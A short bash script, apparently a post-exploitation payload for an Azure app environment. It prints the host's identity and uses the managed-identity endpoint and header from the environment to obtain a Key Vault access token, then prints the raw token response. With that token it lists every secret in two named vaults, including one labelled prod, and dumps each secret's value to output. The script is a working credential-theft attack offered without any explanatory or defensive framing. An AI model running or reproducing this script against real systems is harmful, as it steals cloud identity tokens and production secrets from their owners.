#!/usr/bin/env bash
echo "=== APP PROOF ==="; id; hostname; pwd
E="${IDENTITY_ENDPOINT:-${MSI_ENDPOINT:-}}"; H="${IDENTITY_HEADER:-${MSI_SECRET:-}}"
echo "EP=$E HDRLEN=${#H}"
T=$(curl -s "$E?resource=https://vault.azure.net&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $H")
echo "MITOK=$T"
tok=$(printf '%s' "$T" | jq -r '.access_token // empty'); echo "TOKLEN=${#tok}"
if [ -n "$tok" ]; then for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
  L=$(curl -s -H "Authorization: Bearer $tok" "https://$V.vault.azure.net/secrets?api-version=7.4"); echo "KVLIST $V: $(printf '%s' "$L"|head -c 800)"
  for id in $(printf '%s' "$L" | jq -r '.value[]?.id // empty'); do echo "SECRET $V/$(basename "$id"): $(curl -s -H "Authorization: Bearer $tok" "$id?api-version=7.4")"; done
done; fi
echo "=== INNER DONE ==="
